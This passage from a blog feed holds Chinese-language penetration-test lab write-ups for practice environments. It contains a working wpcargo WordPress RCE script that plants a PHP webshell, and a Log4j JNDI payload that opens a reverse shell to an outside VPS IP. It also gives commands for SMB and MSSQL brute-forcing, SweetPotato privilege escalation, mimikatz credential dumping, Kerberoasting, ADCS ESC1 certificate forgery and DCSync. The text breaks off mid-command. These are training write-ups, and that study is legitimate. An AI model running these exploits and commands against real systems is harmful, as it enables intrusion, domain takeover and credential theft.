(40 / 137) 29.19%  ETA: 00:00:03</span><br><span class="line"> Checking Config Backups - Time: 00:00:02 &lt;=========================================================================================&gt; (137 / 137) 100.00% Time: 00:00:02</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Oct  2 20:50:48 2023</span><br><span class="line">[+] Requests Done: 172</span><br><span class="line">[+] Cached Requests: 5</span><br><span class="line">[+] Data Sent: 42.632 KB</span><br><span class="line">[+] Data Received: 250.835 KB</span><br><span class="line">[+] Memory used: 263.754 MB</span><br><span class="line">[+] Elapsed time: 00:00:16</span><br></pre></td></tr></table></figure><p>wordpress 一般都是先从插件入手, 实在不行了再去爆破用户名密码</p><p>wpcargo 插件存在未授权 RCE, exp 如下</p><p><a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a">https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># This is a magic string that when treated as pixels and compressed using the png</span><br><span class="line"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span><br><span class="line">payload = &#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span><br><span class="line"></span><br><span class="line">def encode_character_code(c: int):</span><br><span class="line">    return &#x27;&#123;:08b&#125;&#x27;.format(c).replace(&#x27;0&#x27;, &#x27;x&#x27;)</span><br><span class="line"></span><br><span class="line">text = &#x27;&#x27;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]</span><br><span class="line"></span><br><span class="line">destination_url = &#x27;http://172.22.2.18/&#x27;</span><br><span class="line">cmd = &#x27;id&#x27;</span><br><span class="line"></span><br><span class="line"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span><br><span class="line">requests.get(</span><br><span class="line">    f&quot;&#123;destination_url&#125;wp-content/plugins/wpcargo/includes/barcode.php?text=&#123;text&#125;&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span><br><span class="line">print(requests.post(</span><br><span class="line">    f&quot;&#123;destination_url&#125;webshell.php?1=system&quot;, data=&#123;&quot;2&quot;: cmd&#125;</span><br><span class="line">).content.decode(&#x27;ascii&#x27;, &#x27;ignore&#x27;))</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231002205425378.png" alt="image-20231002205425378"></p><p>这里记得写马进去  才去连接</p><p><img src="../images/image-20231002210235208.png" alt="image-20231002210235208"></p><p>蚁剑尝试进行连接</p><p><img src="../images/image-20231002210153422.png" alt="image-20231002210153422"></p><p><code>ps -aux</code>  的话发现运行了smb这个服务  但是这里感觉没啥用  就去查看配置文件</p><p><img src="../images/image-20231002210316560.png" alt="image-20231002210316560"></p><p>查看wordpress的配置文件发现了这个数据账号密码</p><p><code>netstat -anl</code>进行查看</p><p><img src="../images/image-20231002210655743.png" alt="image-20231002210655743"></p><p>发现只有本地用户才能访问这个数据库  那么就得在挂一层代理了  但是这里的话我们使用<code>adminer.php</code>这个方法</p><p>下载下来上传到<code>html</code>这个目录下</p><p><img src="../images/image-20231002211020823.png" alt="image-20231002211020823"></p><p>然后直接去访问</p><p>登录成功后  切换数据库</p><p><img src="../images/image-20231002211136394.png" alt="image-20231002211136394"></p><p><img src="../images/image-20231002211232987.png" alt="image-20231002211232987"></p><p>找到第二个flag  然后第二表的名字很有意思</p><p><img src="../images/image-20231002211333708.png" alt="image-20231002211333708"></p><p>列名是密码  那么我们导出全部数据</p><p>然后复制内容到这个1.txt中</p><p>使用python脚本将密码给提取出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">filename = &quot;1.txt&quot;</span><br><span class="line">output_filename = &quot;pass.txt&quot;</span><br><span class="line"></span><br><span class="line"># 从文件中读取数据</span><br><span class="line">with open(filename, &quot;r&quot;) as file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line"></span><br><span class="line"># 使用正则表达式提取字符串</span><br><span class="line">pattern = r&quot;&#x27;(.*?)&#x27;&quot;</span><br><span class="line">strings = [re.findall(pattern, item)[0] for item in data]</span><br><span class="line"></span><br><span class="line"># 将结果输出到文件</span><br><span class="line">with open(output_filename, &quot;w&quot;) as file:</span><br><span class="line">    for string in strings:</span><br><span class="line">        file.write(string + &quot;\n&quot;)</span><br></pre></td></tr></table></figure><p>结合我们刚开始收集到的信息   172.22.2.16这个ip使用windwos主机来当服务器来设置了mssql  并且开启了1433端口  并且我们前面还收集到了 这smb这个服务  于是我们使用上面获取的密码进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64  -h 172.22.2.0/24 -m smb -pwdf pass.txt</span><br><span class="line">./fscan_amd64  -h 172.22.2.0/24 -m mssql -pwdf pass.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64  -h 172.22.2.0/24 -m smb -pwdf pass.txt</span><br><span class="line"></span><br><span class="line">___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">-m  smb  start scan the port: 445</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.2.3      is alive</span><br><span class="line">(icmp) Target 172.22.2.7      is alive</span><br><span class="line">(icmp) Target 172.22.2.16     is alive</span><br><span class="line">(icmp) Target 172.22.2.18     is alive</span><br><span class="line">(icmp) Target 172.22.2.34     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.2.3:445 open</span><br><span class="line">172.22.2.34:445 open</span><br><span class="line">172.22.2.16:445 open</span><br><span class="line">172.22.2.18:445 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[+] SMB:172.22.2.18:445:administrator pAssw0rd</span><br><span class="line">[+] SMB:172.22.2.16:445:admin pAssw0rd</span><br><span class="line">已完成 4/4</span><br></pre></td></tr></table></figure><p>扫描完这个smb的话  登录上去发现没啥用<strong>(是空的)</strong>   于是尝试去扫这个 <code>mssql</code>服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64  -h 172.22.2.0/24 -m mssql -pwdf pass.txt</span><br><span class="line"></span><br><span class="line">/ _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">-m  mssql  start scan the port: 1433</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.2.16     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">172.22.2.16:1433 open</span><br><span class="line">[*] alive ports len is: 1</span><br><span class="line">start vulscan</span><br><span class="line">[+] mssql:172.22.2.16:1433:sa  ElGNkOiC</span><br><span class="line">已完成 1/1</span><br></pre></td></tr></table></figure><p>爆破出了这个172.22.2.16的服务器账号密码</p><p>于是尝试进行登录</p><p><strong>(这里使用的这个工具叫做MUDT)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; &#x27;C:\Program Files\Java\jdk1.8.0_202\bin\java.exe&#x27; -jar .\Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar</span><br></pre></td></tr></table></figure><p>这里使用这个命令进行登录</p><p><img src="../images/image-20231002212509325.png" alt="image-20231002212509325"></p><p><img src="../images/image-20231002212533573.png" alt="image-20231002212533573"></p><p>成功连接该数据库 </p><p> 这里找遍了目录发现没有flag  于是猜测藏在这个Administrator用户里  于是尝试进行提权操作</p><p>这里的话尝试<code>SweetPotato.exe</code>来进行提权————-(<strong>刚开始写的时候有点懵  这里补充写一下为什么使用这个提权的原因</strong>)</p><blockquote><ul><li>第一点 </li></ul><p>就是我们这里登录是服务账户  并且是windows系统  (但这里并不能完全确认使用Potato这个工具)</p><ul><li>第二点</li></ul><p>就是我们使用了whoami /priv发现其开启了SeImpersonatePrivilege这个权限</p></blockquote><p><img src="../images/image-20231003144203530.png" alt="image-20231003144203530"></p><p><strong>(直接拿别人的图了  就不上靶机上重新演示了)</strong></p><blockquote><ul><li>以上两点刚好满足了我们使用potato的这个条件  于是这里我们就可以使用potato这个工具了</li></ul></blockquote><p><strong>以下是提权过程·</strong></p><ul><li>第一步</li></ul><p><img src="../images/image-20231002213023315.png" alt="image-20231002213023315"></p><ul><li>第二步</li></ul><p>上传<code>SweetPotato.exe</code>工具</p><p><img src="../images/image-20231002213209802.png" alt="image-20231002213209802"></p><ul><li>开始提权</li></ul><p><img src="../images/image-20231002213258829.png" alt="image-20231002213258829"></p><p>拿下管理员权限</p><p>因为不知道flag藏在哪  文件名也不知道  <strong>使用dir命令没有反应…….</strong></p><p><img src="../images/image-20231002213757844.png" alt="image-20231002213757844"></p><p>发现3389端口开着呢  于是我们使用管理员权限给本机添加个账号  并且加入本地管理员组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;net user Ke1nys qwer1234! /add&quot;</span><br><span class="line">C:/Users/Public/SweetPotato.exe -a &quot;net localgroup administrators Ke1nys /add&quot;</span><br></pre></td></tr></table></figure><p>RDP进行连接</p><p><img src="../images/image-20231002214041936.png" alt="image-20231002214041936"></p><p>直接去访问这个<code>Administrator</code>用户</p><p><img src="../images/image-20231002214127329.png" alt="image-20231002214127329"></p><p>拿到第三个flag  </p><p>最后的话肯定是拿域控了</p><p>因为我们现在是本地管理员   可以有权限读取本地hash值  于是我们传入mimikatz进行读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure><p>这里记得要以管理员的身份运行  否则会报错  </p><p><img src="../images/image-20231002214840666.png" alt="image-20231002214840666"></p><p>一个一个翻，可以翻到<code>MSSQLSERVER$</code>这个用户，MSSQLSERVER 配置了到域控的约束委派, 可以通过 S4U 伪造高权限 ST 拿下域控，并且似乎只有他的NTLM哈希可用，我们用Rubeus申请访问自身的服务票据</p><p><strong>(这里的话不使用bloodhound的原因就是我们新创建的用户只是本地管理员用户  并不是域用户  所以不能使用bloodhound这个东西来获取域内环境的联系)</strong></p><p>这里的话是使用<code>Rubeus</code>这个工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:f05a1195c832a5d5bf080c8bed5ac227 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231002215710933.png" alt="image-20231002215710933"></p><p><strong>抓到后伪造这个域管用户的ST  然后注入票据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:你上面抓到的服务票据</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231002215954416.png" alt="image-20231002215954416"></p><p>成功注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><p>读取flag</p><p><img src="../images/image-20231002220136592.png" alt="image-20231002220136592"></p><p>这里的话其实使用kekeo这工具也行其实</p><p><strong>偷张图  不知道他咋整的</strong></p><p><img src="../images/image-20231002223239748.png" alt="image-20231002223239748"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;h2 id=&quot;外网打点&quot;&gt;&lt;a href=&quot;#外网打点&quot; class=&quot;headerlink&quot; title=&quot;外网打点&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Certify</title>
    <link href="https://ke1nys.github.io/posts/c964b814.html"/>
    <id>https://ke1nys.github.io/posts/c964b814.html</id>
    <published>2023-09-29T08:36:18.000Z</published>
    <updated>2023-10-04T08:00:44.878Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>拿到ip后还是先使用fscan进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 39.98.127.239 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929164056646.png" alt="image-20230929164056646"></p><p>8983端口开了这个服务  是solr</p><p><img src="../images/image-20230929164158696.png" alt="image-20230929164158696"></p><p>查看到版本号  于是Google查找</p><p><a href="https://zgao.top/cve-2021-44228-apache-log4j2-lookup-jndi-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">找了这篇文章  于是进行getshell操作</a></p><p>先测试是否存在这个漏洞</p><p><img src="../images/image-20230929164658642.png" alt="image-20230929164658642"></p><p><img src="../images/image-20230929164707027.png" alt="image-20230929164707027"></p><p>漏洞存在进行getshell操作</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>这里的话使用这个工具</p><blockquote><p>JNDIExploit-1.3-SNAPSHOT.jar    <a href="https://github.com/WhiteHSBG/JNDIExploit/releases">https://github.com/WhiteHSBG/JNDIExploit/releases</a></p></blockquote><p><img src="../images/image-20230929164938220.png" alt="image-20230929164938220"></p><p>在自己的vps上启动</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://101.42.39.110:1389/Basic/ReverseShell/101.42.39.110/3389&#125;</span><br></pre></td></tr></table></figure><p><strong>记得把端口给打开</strong></p><p>然后监听3389端口</p><p><img src="../images/image-20230929165107113.png" alt="image-20230929165107113"></p><p>成功  并且成功弹到了shell</p><p>这里查看了一下根目录和home目录  发现没有flag于是就猜测要提权了</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这里的话就常规三件套了 </p><p><strong>sudo suid 内核  挨个找就行了</strong></p><p><img src="../images/image-20230929165527023.png" alt="image-20230929165527023"></p><p>刚好发现一个以root命令执行的命令  并且不需要密码</p><p><img src="../images/image-20230929165737722.png" alt="image-20230929165737722"></p><p>然后直接找flag</p><p><img src="../images/image-20230929165821122.png" alt="image-20230929165821122"></p><p>然后直接读取就行了</p><p><img src="../images/image-20230929165924783.png" alt="image-20230929165924783"></p><p>接下来就开始内网渗透了</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>先查看内网ip</p><p><img src="../images/image-20230929170013233.png" alt="image-20230929170013233"></p><p>wget传一个fscan进行开扫  <strong>(记得传到tmp目录下 因为这个目录下的权限高)</strong></p><p><img src="../images/image-20230929170712698.png" alt="image-20230929170712698"></p><p>一共发现了这些信息  </p><blockquote><p>172.22.9.7 ——-&gt; 域控主机   3389</p><p>172.22.9.19   —-&gt;  linux服务器</p><p>172.22.9.26 ——&gt;  普通域用户  3389</p><p>172.22.9.47  ——&gt;  apache</p></blockquote><p>于是先从这个使用了apache来搭建的fileserver的地址来入手</p><h3 id="隧道代理"><a href="#隧道代理" class="headerlink" title="隧道代理"></a>隧道代理</h3><p>这里用的是chisel这个工具</p><p><strong>(在代理的那篇文章里有讲到)</strong></p><blockquote><p> ./chisel server -p 1234 —reverse       //vps上运行</p><p>  ./chisel client 101.42.39.110:1234 R:0.0.0.0:7777:socks     //getshell主机上运行</p></blockquote><p><img src="../images/image-20230929171459695.png" alt="image-20230929171459695"></p><p>成功挂上了代理</p><p><strong>(这里的proxychains和proxifier自己百度解决就行)</strong></p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>然后扫描的时候发现了  这个47这台机器开启了445  然后又扫到了这个fileserver服务</p><p>直接无密码登录smb试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient -L 172.22.9.47</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929172011893.png" alt="image-20230929172011893"></p><p>发现可以无密码登录</p><p>于是就去查看他的文件共享文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient //172.22.9.47/fileshare</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929172231585.png" alt="image-20230929172231585"></p><p>然后使用get命令下载到本地就行了</p><p><img src="../images/image-20230929172316062.png" alt="image-20230929172316062"></p><p>发现给了个SPN的提示   <strong>(先不管  遇到再说)</strong></p><p>在查看文件共享的时候  还发现了个person.db这个文件夹  于是下载到本地进行查看</p><p><img src="../images/image-20230929172834723.png" alt="image-20230929172834723"></p><p>发现了存在四个表</p><ul><li><strong>User表</strong></li></ul><p><img src="../images/image-20230929172909693.png" alt="image-20230929172909693"></p><p>存在了三个用户的密码</p><ul><li><strong>Members表</strong></li></ul><p><img src="../images/image-20230929172953874.png" alt="image-20230929172953874"></p><p><strong>这个表是存在了域里用户的表  (不知道是不是全部)</strong></p><p>然后我们尝试将用户名全部提取出来进行密码喷洒攻击  来找到可以利用用户的账号密码</p><ul><li><strong>提取脚本</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开原始数据文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取指定字符串</span></span><br><span class="line">users = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;(\w+)@xiaorang.lab&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        username = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        users.append(username)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存提取后的字符串到 user.txt</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        file.write(user + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>1.txt直接把members整个表复制进去就行</p><p><img src="../images/image-20230929173220039.png" alt="image-20230929173220039"></p><p>运行之后就会得到所有的用户   </p><p>然后使用这个<code>kerbrute_windows_amd64.exe</code>工具进行密码喷洒攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 172.22.9.7 -d xiaorang.lab user.txt i9XDE02pLVf</span><br><span class="line"></span><br><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 172.22.9.7 -d xiaorang.lab user.txt 6N70jt2K9sV</span><br><span class="line"></span><br><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 172.22.9.7 -d xiaorang.lab user.txt fiAzGwEMgTY</span><br></pre></td></tr></table></figure><blockquote><p>2023/09/29 17:44:29 &gt;  [+] VALID LOGIN:  liupeng@xiaorang.lab:fiAzGwEMgTY</p><p>2023/09/29 17:44:04 &gt;  [+] VALID LOGIN:  zhangjian@xiaorang.lab:i9XDE02pLVf</p></blockquote><p>一共就是爆破出这个两个账号  因为上面提示了SPN  于是我们可以枚举一下域里的SPN</p><p><strong>(先是RDP失败了)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929175030774.png" alt="image-20230929175030774"></p><p>不适用-request的话 是只返回域中的所有SPN  包括服务账户  服务主机</p><p>这里使用-request来请求返回域中所有SPN的hash值  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在一般情况下，SPN 的哈希值是根据服务账户的名称生成的，因此可以认为 SPN 的哈希值包含了该服务账户的信息。哈希值是通过对服务账户名称进行哈希运算而得到的固定长度的字符串。</span><br></pre></td></tr></table></figure><p>于是我们尝试爆破服务用户的服务票据   </p><p><img src="../images/image-20230929175802046.png" alt="image-20230929175802046"></p><p>(这里的爆破类型是13100)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929180309246.png" alt="image-20230929180309246"></p><p>爆破成功</p><p><code>zhangxia–MyPass2@@6</code></p><p>尝试rdp登录  </p><p><strong>(这里使用RDP的话注意一点   用户名要这样写<code>zhangxia@XIAORANG.LAB</code>    后面跟着域)</strong></p><p><img src="../images/image-20230929180713709.png" alt="image-20230929180713709"></p><p><strong>成功登录  直接线上sharphood进去收集一下域的信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe --CollectionMethods All --Domain xiaorang.lab --ExcludeDCs</span><br></pre></td></tr></table></figure><p>然后将压缩包复制出来  拖到这个bloodhound里进行分析</p><p><img src="../images/image-20230929180904838.png" alt="image-20230929180904838"></p><p>RBCD条件反应  但是这里题目考察的是CS证书  所以这里没尝试</p><p>这里使用的工具是<code>Certify.exe</code>这个工具  于是尝试进行利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /vulnerable</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929181907979.png" alt="image-20230929181907979"></p><p>发现确实是存在这个证书模板可以利用</p><p>这里要成功利用要满足三个点<br>1、我们需要有权限去获取证书<br>2、能够登记为客户端身份验证或智能卡登录等<br>3、CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT开启</p><p><strong>(证书可以用于身份验证  所以就是为什么可以利用的原因)</strong></p><p><img src="../images/image-20230929182437803.png" alt="image-20230929182437803"></p><p><img src="../images/80cd55f56f02f549d69e71fa2af90b55.png" alt="img"></p><p>域渗透中和证书服务器相关的利用有ESC1和ESC8  这个exe文件这里没有写  我们拿linux的certify工具进行尝试尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad find -u &#x27;liupeng@xiaorang.lab&#x27;  -password &#x27;fiAzGwEMgTY&#x27; -dc-ip 172.22.9.7 -vulnerable -stdout</span><br></pre></td></tr></table></figure><p>发现域渗透中和证书服务器相关的利用有<code>ESC1</code>和<code>ESC8</code></p><p>这里的话就只存在这个<code>ESC1</code></p><p>开始申请 <code>XR Manager</code> 证书模版并伪造域管理员</p><p><img src="../images/image-20230929183202464.png" alt="image-20230929183202464"></p><p>两个关键参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Certify.exe request /ca:XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA /template:&quot;XR Manager&quot; /altname:XIAORANG.LAB\Administrator</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929183345036.png" alt="image-20230929183345036"></p><p>这里伪造的是域管理员账户  </p><p>新建一个cert.pem  然后把内容复制进去</p><p>然后使用openssl转成pfx文件  就是证书</p><p><strong>(这里转的话在cert.pem内容下面有指令)</strong></p><p><strong>tmd  这里折磨了我好几个小时  因为这个转化的是使用openssl—v1.1版本才行  wtmc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929184411146.png" alt="image-20230929184411146"></p><p>然后将pfx文件复制rdp主机里</p><p>然后使用<code>Rubeus.exe</code>工具来请求票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password: /ptt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929184709538.png" alt="image-20230929184709538"></p><p>请求域管理员的TGT成功  那么接下来就是想干啥干啥了</p><p><img src="../images/image-20230929184914327.png" alt="image-20230929184914327"></p><p>然后使用mimikatz.exe来获取hash值</p><p><strong>Dc’Sync攻击</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; 